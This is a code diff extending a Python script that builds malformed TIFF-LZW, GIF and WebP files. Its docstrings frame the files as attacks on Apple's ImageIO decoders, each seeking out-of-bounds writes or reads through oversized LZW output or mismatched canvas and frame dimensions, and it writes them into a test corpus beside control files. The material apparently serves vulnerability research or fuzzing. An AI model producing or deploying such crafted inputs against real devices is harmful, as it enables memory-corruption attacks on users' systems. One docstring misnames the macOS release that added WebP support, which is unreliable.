@@ -865,6 +865,434 @@ def build_png_text_chunk_overflow(width=8, height=8):
     return PNG_SIG + ihdr + bad_text_chunk + idat + iend
 
 
+# ========================== TIFF + LZW encoder ==========================
+
+def _tiff_lzw_encode(data):
+    """TIFF LZW encoder: MSB-first bit packing, 12-bit maximum code width."""
+    CLEAR = 256
+    STOP  = 257
+
+    table = {bytes([i]): i for i in range(256)}
+    next_code = 258
+    code_width = 9
+
+    bit_buf = 0
+    bit_len = 0
+    result  = bytearray()
+
+    def emit(code):
+        nonlocal bit_buf, bit_len
+        bit_buf = (bit_buf << code_width) | (code & ((1 << code_width) - 1))
+        bit_len += code_width
+        while bit_len >= 8:
+            bit_len -= 8
+            result.append((bit_buf >> bit_len) & 0xFF)
+
+    emit(CLEAR)
+
+    if not data:
+        emit(STOP)
+        if bit_len:
+            result.append((bit_buf << (8 - bit_len)) & 0xFF)
+        return bytes(result)
+
+    w = bytes([data[0]])
+    for byte in data[1:]:
+        c  = bytes([byte])
+        wc = w + c
+        if wc in table:
+            w = wc
+        else:
+            emit(table[w])
+            if next_code < 4096:
+                table[wc] = next_code
+                next_code += 1
+                if next_code >= (1 << code_width) and code_width < 12:
+                    code_width += 1
+            else:
+                emit(CLEAR)
+                table      = {bytes([i]): i for i in range(256)}
+                next_code  = 258
+                code_width = 9
+            w = c
+
+    emit(table[w])
+    emit(STOP)
+    if bit_len:
+        result.append((bit_buf << (8 - bit_len)) & 0xFF)
+    return bytes(result)
+
+
+def build_tiff_lzw_overflow(width=64, height=64, spp=3, bits=8, extra_bytes=0):
+    """
+    TIFF with LZW compression (compression=5).
+
+    Same attack class as Deflate overflow but different decoder code path.
+    Apple uses a separate LZW decompressor (historically libtiff's LZW, now
+    custom). If the decompressor doesn't cap output at the expected strip size,
+    extra_bytes bytes are written past the output buffer end (OOB write).
+
+    CTRL: extra_bytes=0 (decompresses to exactly width*height*spp bytes).
+    Attack: extra_bytes=1MB/4MB — forces the LZW output to exceed the buffer.
+    """
+    expected   = width * height * spp * (bits // 8)
+    compressed = _tiff_lzw_encode(bytes(expected + extra_bytes))
+
+    b = TiffBuilder()
+    b.add_long(T_IMAGE_WIDTH,  width)
+    b.add_long(T_IMAGE_LENGTH, height)
+    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
+    b.add_short(T_COMPRESSION, COMP_LZW)
+    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)
+    b.add_long(T_ROWS_PER_STRIP, height)
+    b.add_short(T_PLANAR_CONFIG, 1)
+    b.add_short(T_RESOLUTION_UNIT, 2)
+    b.add_rational(T_X_RESOLUTION, 72, 1)
+    b.add_rational(T_Y_RESOLUTION, 72, 1)
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, compressed)
+    return b.build()
+
+
+# ========================== GIF builder ==========================
+
+def _gif_lzw_encode(data, min_code_size=8):
+    """GIF LZW encoder: LSB-first bit packing, 12-bit maximum code width."""
+    CLEAR = 1 << min_code_size
+    STOP  = CLEAR + 1
+
+    table      = {bytes([i]): i for i in range(CLEAR)}
+    next_code  = STOP + 1
+    code_width = min_code_size + 1
+
+    bit_buf = 0
+    bit_len = 0
+    bits    = bytearray()
+
+    def emit(code):
+        nonlocal bit_buf, bit_len
+        bit_buf |= (code & ((1 << code_width) - 1)) << bit_len
+        bit_len += code_width
+        while bit_len >= 8:
+            bits.append(bit_buf & 0xFF)
+            bit_buf >>= 8
+            bit_len  -= 8
+
+    emit(CLEAR)
+
+    if data:
+        w = bytes([data[0]])
+        for byte in data[1:]:
+            c  = bytes([byte])
+            wc = w + c
+            if wc in table:
+                w = wc
+            else:
+                emit(table[w])
+                if next_code <= 4095:
+                    table[wc] = next_code
+                    next_code += 1
+                    if next_code >= (1 << code_width) and code_width < 12:
+                        code_width += 1
+                else:
+                    emit(CLEAR)
+                    table      = {bytes([i]): i for i in range(CLEAR)}
+                    next_code  = STOP + 1
+                    code_width = min_code_size + 1
+                w = c
+        emit(table[w])
+
+    emit(STOP)
+    if bit_len:
+        bits.append(bit_buf & 0xFF)
+
+    # Pack into GIF sub-blocks (max 255 bytes each, terminated by 0x00)
+    out = bytearray()
+    i = 0
+    while i < len(bits):
+        chunk = bits[i:i + 255]
+        out.append(len(chunk))
+        out.extend(chunk)
+        i += 255
+    out.append(0)
+    return bytes(out)
+
+
+def build_gif_ctrl(width=64, height=64):
+    """Valid GIF89a — confirms Apple's ImageIO accepts GIF and decodes it."""
+    gct    = bytes([i for i in range(256) for _ in range(3)])  # 256-gray palette
+    pixels = bytes(width * height)                              # all-black
+    lzw    = bytes([8]) + _gif_lzw_encode(pixels, min_code_size=8)
+
+    hdr = b'GIF89a'
+    lsd = struct.pack('<HH', width, height) + bytes([0x97, 0, 0])
+    imd = b'\x2C' + struct.pack('<HHHH', 0, 0, width, height) + bytes([0x00])
+    return hdr + lsd + gct + imd + lzw + b'\x3B'
+
+
+def build_gif_frame_oob(canvas_w=32, canvas_h=32, frame_w=4096, frame_h=4096,
+                        actual_rows=4):
+    """
+    GIF where the Image Descriptor declares frame_w x frame_h but:
+      (a) the logical screen (canvas) is only canvas_w x canvas_h, AND
+      (b) the LZW stream contains only actual_rows rows of pixel data.
+
+    Attack surface:
+      If the decoder allocates canvas_w * canvas_h pixels and decompresses
+      the LZW stream directly into that buffer using frame_w * frame_h as
+      the row stride or loop bound, it writes past the canvas allocation.
+      Even if a separate per-frame buffer is used, decompressing frame_w *
+      frame_h pixels from a stream that only encodes actual_rows rows causes
+      an OOB READ from the LZW bitstream (reading past the end of the stream).
+
+    The frame position (0, 0) is within the canvas. The right/bottom edges
+    of the frame extend (frame_w - canvas_w) and (frame_h - canvas_h) pixels
+    beyond the canvas boundary.
+    """
+    gct    = bytes([i for i in range(256) for _ in range(3)])
+    pixels = bytes(frame_w * actual_rows)
+    lzw    = bytes([8]) + _gif_lzw_encode(pixels, min_code_size=8)
+
+    hdr = b'GIF89a'
+    lsd = struct.pack('<HH', canvas_w, canvas_h) + bytes([0x97, 0, 0])
+    imd = b'\x2C' + struct.pack('<HHHH', 0, 0, frame_w, frame_h) + bytes([0x00])
+    return hdr + lsd + gct + imd + lzw + b'\x3B'
+
+
+def build_gif_frame_offset_oob(canvas_w=64, canvas_h=64):
+    """
+    GIF where the frame descriptor's (left, top) offset places the frame
+    entirely outside the canvas bounds. The frame is 32x32 starting at
+    (canvas_w - 1, canvas_h - 1), so 31 columns and 31 rows extend past
+    the canvas boundary.
+
+    A decoder that writes frame pixels at canvas_ptr + top*canvas_stride + left
+    without clipping will write 31*32 = 992 pixels past the canvas buffer end.
+    """
+    gct    = bytes([i for i in range(256) for _ in range(3)])
+    fw, fh = 32, 32
+    left   = canvas_w - 1
+    top    = canvas_h - 1
+    pixels = bytes(fw * fh)
+    lzw    = bytes([8]) + _gif_lzw_encode(pixels, min_code_size=8)
+
+    hdr = b'GIF89a'
+    lsd = struct.pack('<HH', canvas_w, canvas_h) + bytes([0x97, 0, 0])
+    imd = b'\x2C' + struct.pack('<HHHH', left, top, fw, fh) + bytes([0x00])
+    return hdr + lsd + gct + imd + lzw + b'\x3B'
+
+
+# ========================== WebP builder ==========================
+
+def build_webp_vp8x_mismatch(canvas_w=32, canvas_h=32, frame_w=4096, frame_h=4096):
+    """
+    Extended WebP (VP8X) where:
+      - VP8X announces canvas_w x canvas_h (small — ~4KB decoded buffer)
+      - VP8L frame header claims frame_w x frame_h (large — ~64MB decode expected)
+
+    If Apple's ImageIO allocates the output buffer from the VP8X canvas size
+    and then hands that buffer to the VP8L decoder which uses the VP8L frame
+    dimensions as its output loop bound → OOB write of 64MB - 4KB bytes.
+
+    The VP8L bitstream is a valid minimal encoding for a canvas_w x canvas_h
+    image (the actual pixel data section). The VP8L HEADER however claims
+    frame_w x frame_h by patching the packed dimension bits.
+
+    Attack surface: Apple's WebP decoder (libwebp or custom) in ImageIO.framework.
+    Added in macOS 11 Monterey — less audited than TIFF/PNG/JPEG paths.
+    """
+    # Build a valid VP8L bitstream for a canvas_w x canvas_h all-black image.
+    # VP8L header: signature(0x2F) + packed bits (width-1, height-1, alpha, version).
+    # We will patch the dimension bits to claim frame_w x frame_h while keeping
+    # the rest of the bitstream (entropy tables + pixel data) for canvas_w x canvas_h.
+    # Decoders that trust the VP8L header dimensions for allocation/loop bounds
+    # will over-allocate and/or write past the canonical canvas buffer.
+
+    def _pack_vp8l_dims(w, h, has_alpha=0, version=0):
+        """Pack (w-1, h-1, has_alpha, version) into 4 bytes, LSB-first."""
+        # Bits [0:13]=width-1, [14:27]=height-1, [28]=has_alpha, [29:31]=version
+        val = ((w - 1) & 0x3FFF) | (((h - 1) & 0x3FFF) << 14) | ((has_alpha & 1) << 28) | ((version & 7) << 29)
+        return struct.pack('<I', val)
+
+    # VP8L image data for a 1-color (black) N×M image using simple Huffman trees.
+    # After the 4-byte packed header, the image data is:
+    #   transforms_present (1 bit = 0)
+    #   color_cache (1 bit = 0, no cache)
+    #   5 Huffman trees (G, R, B, A, dist), each simple with 1 symbol
+    # Simple 1-symbol Huffman tree encoding:
+    #   type indicator = 1 (simple), then 0 (1 symbol), then 1 bit (0=8-bit symbol), symbol(8)
+    # Pixel data: canvas_w * canvas_h codes from G-tree, all 0 (all-black).
+    # Since all pixels are G=0, R=0, B=0, A=0xFF (but for simplicity use A=0):
+    # G tree: 1 symbol = 0     (code '0')
+    # R tree: 1 symbol = 0     (code '0')
+    # B tree: 1 symbol = 0     (code '0')
+    # A tree: 1 symbol = 0xFF  (code '0')
+    # dist:   1 symbol = 0     (code '0')
+    # Pixel codes: canvas_w * canvas_h bits of '0' (all green=0)
+    # Then ARGB is reconstructed: G=decoded, RBA from ref-codes (all 0→ literal RBA=0,0,0 → fine)
+
+    # Build the VP8L bitstream bits (LSB-first):
+    bits    = 0
+    bit_len = 0
+    vp8l_bytes = bytearray()
+
+    def _emit(val, nbits):
+        nonlocal bits, bit_len
+        bits    |= (val & ((1 << nbits) - 1)) << bit_len
+        bit_len += nbits
+        while bit_len >= 8:
+            vp8l_bytes.append(bits & 0xFF)
+            bits    >>= 8
+            bit_len  -= 8
+
+    # transforms_present = 0 (no transforms)
+    _emit(0, 1)
+    # color_cache_present = 0
+    _emit(0, 1)
+    # 5 simple Huffman trees (G, R, B, A, dist)
+    for sym in [0, 0, 0, 0xFF, 0]:  # G=0, R=0, B=0, A=255, dist=0
+        _emit(1, 1)   # is_simple_code = 1
+        _emit(0, 1)   # num_symbols - 1 = 0 (1 symbol)
+        _emit(0, 1)   # first_sym_len: 0 = 8-bit symbol
+        _emit(sym, 8) # symbol value
+
+    # Pixel data: canvas_w * canvas_h codes, each is '0' (1 bit per pixel from simple tree)
+    n_pixels = canvas_w * canvas_h
+    # Each pixel is code 0 from G-tree (1-bit code '0'), then R(0), B(0), A(0xFF)
+    # all map to single-bit code '0' → n_pixels * 4 zero bits total
+    for _ in range(n_pixels * 4):
+        _emit(0, 1)
+
+    if bit_len:
+        vp8l_bytes.append(bits & 0xFF)
+
+    # VP8L chunk for a CTRL canvas_w x canvas_h image:
+    vp8l_data = bytes([0x2F]) + _pack_vp8l_dims(canvas_w, canvas_h) + bytes(vp8l_bytes)
+
+    # --- Mismatch variant: patch VP8L header to claim frame_w x frame_h ---
+    # The VP8L decoder reads dimensions from bytes 1-4 (after 0x2F signature).
+    # Patching these to frame_w x frame_h fools the decoder into thinking it
+    # must decode frame_w * frame_h pixels — but the entropy data is only
+    # canvas_w * canvas_h pixels.  If allocation is based on patched dims,
+    # OOB write occurs; if allocation is based on VP8X canvas, OOB read occurs.
+    vp8l_mismatch = bytes([0x2F]) + _pack_vp8l_dims(frame_w, frame_h) + bytes(vp8l_bytes)
+
+    def _webp_chunk(fourcc, data):
+        data = bytes(data)
+        pad  = bytes(len(data) % 2)   # chunks must be WORD-aligned
+        return fourcc + struct.pack('<I', len(data)) + data + pad
+
+    def _build_vp8x(flags, cw, ch):
+        # VP8X payload: flags(4B), canvas_width-1 (3B LE), canvas_height-1 (3B LE)
+        payload = struct.pack('<I', flags)
+        payload += struct.pack('<I', cw - 1)[:3]
+        payload += struct.pack('<I', ch - 1)[:3]
+        return _webp_chunk(b'VP8X', payload)
+
+    # Mismatch file: VP8X says canvas_w x canvas_h, VP8L claims frame_w x frame_h
+    vp8x   = _build_vp8x(0, canvas_w, canvas_h)
+    vp8l_c = _webp_chunk(b'VP8L', vp8l_mismatch)
+    body   = b'WEBP' + vp8x + vp8l_c
+    return b'RIFF' + struct.pack('<I', len(body)) + body
+
+
+def build_webp_ctrl(width=64, height=64):
+    """Valid extended WebP with matching VP8X canvas and VP8L frame dimensions."""
+    def _pack_vp8l_dims(w, h, has_alpha=0, version=0):
+        val = ((w - 1) & 0x3FFF) | (((h - 1) & 0x3FFF) << 14) | ((has_alpha & 1) << 28) | ((version & 7) << 29)
+        return struct.pack('<I', val)
+
+    bits    = 0
+    bit_len = 0
+    vp8l_bytes = bytearray()
+
+    def _emit(val, nbits):
+        nonlocal bits, bit_len
+        bits    |= (val & ((1 << nbits) - 1)) << bit_len
+        bit_len += nbits
+        while bit_len >= 8:
+            vp8l_bytes.append(bits & 0xFF)
+            bits    >>= 8
+            bit_len  -= 8
+
+    _emit(0, 1)  # no transforms
+    _emit(0, 1)  # no color cache
+    for sym in [0, 0, 0, 0xFF, 0]:
+        _emit(1, 1); _emit(0, 1); _emit(0, 1); _emit(sym, 8)
+    for _ in range(width * height * 4):
+        _emit(0, 1)
+    if bit_len:
+        vp8l_bytes.append(bits & 0xFF)
+
+    vp8l_data = bytes([0x2F]) + _pack_vp8l_dims(width, height) + bytes(vp8l_bytes)
+
+    def _webp_chunk(fourcc, data):
+        data = bytes(data)
+        return fourcc + struct.pack('<I', len(data)) + data + bytes(len(data) % 2)
+
+    def _build_vp8x(cw, ch):
+        payload = struct.pack('<I', 0)
+        payload += struct.pack('<I', cw - 1)[:3]
+        payload += struct.pack('<I', ch - 1)[:3]
+        return _webp_chunk(b'VP8X', payload)
+
+    vp8x   = _build_vp8x(width, height)
+    vp8l_c = _webp_chunk(b'VP8L', vp8l_data)
+    body   = b'WEBP' + vp8x + vp8l_c
+    return b'RIFF' + struct.pack('<I', len(body)) + body
+
+
+def build_webp_large_canvas(canvas_w=4096, canvas_h=4096, frame_w=32, frame_h=32):
+    """
+    Extended WebP where VP8X canvas is LARGE (4096×4096) but the VP8L frame
+    is SMALL (32×32). If Apple allocates canvas-sized buffer and passes it to
+    the VP8L compositor, no OOB occurs. If the compositor then tries to fill
+    the canvas beyond the frame — reading uninit memory — information leak.
+    Controls whether Apple reads frame dims or canvas dims for the compositor.
+    """
+    def _pack_vp8l_dims(w, h, has_alpha=0, version=0):
+        val = ((w - 1) & 0x3FFF) | (((h - 1) & 0x3FFF) << 14) | ((has_alpha & 1) << 28) | ((version & 7) << 29)
+        return struct.pack('<I', val)
+
+    bits    = 0
+    bit_len = 0
+    vp8l_bytes = bytearray()
+
+    def _emit(val, nbits):
+        nonlocal bits, bit_len
+        bits    |= (val & ((1 << nbits) - 1)) << bit_len
+        bit_len += nbits
+        while bit_len >= 8:
+            vp8l_bytes.append(bits & 0xFF)
+            bits    >>= 8
+            bit_len  -= 8
+
+    _emit(0, 1); _emit(0, 1)
+    for sym in [0, 0, 0, 0xFF, 0]:
+        _emit(1, 1); _emit(0, 1); _emit(0, 1); _emit(sym, 8)
+    for _ in range(frame_w * frame_h * 4):
+        _emit(0, 1)
+    if bit_len:
+        vp8l_bytes.append(bits & 0xFF)
+
+    vp8l_data = bytes([0x2F]) + _pack_vp8l_dims(frame_w, frame_h) + bytes(vp8l_bytes)
+
+    def _webp_chunk(fourcc, data):
+        data = bytes(data)
+        return fourcc + struct.pack('<I', len(data)) + data + bytes(len(data) % 2)
+
+    def _build_vp8x(cw, ch):
+        payload = struct.pack('<I', 0)
+        payload += struct.pack('<I', cw - 1)[:3]
+        payload += struct.pack('<I', ch - 1)[:3]
+        return _webp_chunk(b'VP8X', payload)
+
+    vp8x   = _build_vp8x(canvas_w, canvas_h)
+    vp8l_c = _webp_chunk(b'VP8L', vp8l_data)
+    body   = b'WEBP' + vp8x + vp8l_c
+    return b'RIFF' + struct.pack('<I', len(body)) + body
+
+
 # ========================== TIFF + Deflate builder ==========================
 
 def build_tiff_deflate_overflow(width=64, height=64, spp=3, bits=8, extra_bytes=0):
@@ -1606,6 +2034,82 @@ def generate_corpus(outdir='corpus'):
     print('\n[*] ROUND 5: ICO format mismatch (directory vs embedded image):')
     for name, data in ico_cases:
         fname = os.path.join(outdir, f'{name}.ico')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- ROUND 6: TIFF + LZW decompressed size overflow ----
+    # Same attack class as TIFF+Deflate (which Apple caps at expected size).
+    # LZW uses a completely different Apple decoder code path — worth confirming.
+    lzw_cases = [
+        ('CTRL_tiff_lzw_64x64_3spp',
+         build_tiff_lzw_overflow(64, 64, spp=3, extra_bytes=0)),
+        ('CTRL_tiff_lzw_64x64_1spp',
+         build_tiff_lzw_overflow(64, 64, spp=1, extra_bytes=0)),
+        ('tiff_lzw_overflow_1mb',
+         build_tiff_lzw_overflow(64, 64, spp=3, extra_bytes=1 * 1024 * 1024)),
+        ('tiff_lzw_overflow_4mb',
+         build_tiff_lzw_overflow(64, 64, spp=3, extra_bytes=4 * 1024 * 1024)),
+        ('tiff_lzw_256x256_overflow_4mb',
+         build_tiff_lzw_overflow(256, 256, spp=3, extra_bytes=4 * 1024 * 1024)),
+    ]
+    print('\n[*] ROUND 6: TIFF + LZW decompressed size overflow:')
+    for name, data in lzw_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- ROUND 6: GIF canvas vs frame dimension mismatch ----
+    # Apple's GIF decoder allocates canvas_w * canvas_h pixels. If the Image
+    # Descriptor declares a larger frame, the decoder may write frame_w *
+    # frame_h pixels past the canvas buffer end (OOB write), or read past the
+    # LZW stream when decompressing more pixels than provided (OOB read).
+    gif_cases = [
+        ('CTRL_gif_64x64',
+         build_gif_ctrl(64, 64)),
+        # Frame larger than canvas: frame 4096×4096 into 32×32 canvas
+        ('gif_frame_oob_32canvas_4096frame',
+         build_gif_frame_oob(32, 32, 4096, 4096, actual_rows=4)),
+        # Frame larger than canvas: 1024×1024 frame in 64×64 canvas
+        ('gif_frame_oob_64canvas_1024frame',
+         build_gif_frame_oob(64, 64, 1024, 1024, actual_rows=4)),
+        # Frame wider than canvas, frame_h == canvas_h (horizontal-only overflow)
+        ('gif_frame_oob_64canvas_4096wide',
+         build_gif_frame_oob(64, 64, 4096, 64, actual_rows=4)),
+        # Frame offset placing frame partially outside canvas (write past canvas end)
+        ('gif_frame_offset_oob_64canvas',
+         build_gif_frame_offset_oob(64, 64)),
+    ]
+    print('\n[*] ROUND 6: GIF canvas vs frame dimension mismatch:')
+    for name, data in gif_cases:
+        fname = os.path.join(outdir, f'{name}.gif')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- ROUND 6: WebP VP8X canvas vs VP8L frame dimension mismatch ----
+    # Apple added native WebP support in macOS 11 Monterey (2021). Extended
+    # WebP (VP8X) declares a canvas size in the file header; the embedded VP8L
+    # bitstream declares its own frame dimensions. If the decoder allocates the
+    # output buffer from VP8X canvas but iterates using VP8L frame dims → OOB.
+    webp_cases = [
+        # CTRL: matching 64×64 VP8X + VP8L (confirms WebP path is reachable)
+        ('CTRL_webp_vp8x_64x64',
+         build_webp_ctrl(64, 64)),
+        # Mismatch: VP8X canvas=32×32 (4KB alloc), VP8L header claims 4096×4096
+        ('webp_vp8x_32canvas_vp8l_4096frame',
+         build_webp_vp8x_mismatch(32, 32, 4096, 4096)),
+        # Mismatch: VP8X canvas=64×64, VP8L claims 1024×1024
+        ('webp_vp8x_64canvas_vp8l_1024frame',
+         build_webp_vp8x_mismatch(64, 64, 1024, 1024)),
+        # Reverse: VP8X canvas=4096×4096, VP8L frame=32×32 (large alloc, small decode)
+        ('webp_vp8x_4096canvas_vp8l_32frame',
+         build_webp_large_canvas(4096, 4096, 32, 32)),
+    ]
+    print('\n[*] ROUND 6: WebP VP8X canvas vs VP8L frame dimension mismatch:')
+    for name, data in webp_cases:
+        fname = os.path.join(outdir, f'{name}.webp')
         with open(fname, 'wb') as f:
             f.write(data)
         print(f'    {fname}  ({len(data)} bytes)')
